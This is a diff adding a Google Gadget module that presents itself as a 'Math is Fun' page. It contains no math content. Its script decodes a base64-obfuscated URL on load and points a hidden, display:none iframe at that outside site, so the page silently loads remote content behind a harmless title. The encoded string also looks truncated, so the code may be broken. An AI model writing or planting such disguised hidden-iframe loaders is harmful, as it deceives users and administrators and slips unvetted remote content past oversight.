@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Module>
+  <ModulePrefs title="Math is Fun" />
+  <Content type="html">
+    <![CDATA[
+      <html>
+        <head>
+          <title>Math is Fun</title>
+        </head>
+        <body>
+          <div id="iframe-container">
+            <iframe id="hidden-iframe" style="display: none;"></iframe>
+          </div>
+          
+          <script>
+            // Obfuscate the URL and load the iframe dynamically
+            (function() {
+              var iframe = document.getElementById('hidden-iframe');
+              var url = "aHR0cHM6Ly9hZGRpdGlvbi5wYXJ0aWNsZS5lcz"; // Base64 encoded URL
+              iframe.src = atob(url);
+            })();
+          </script>
+        </body>
+      </html>
+    ]]>
+  </Content>
+</Module>
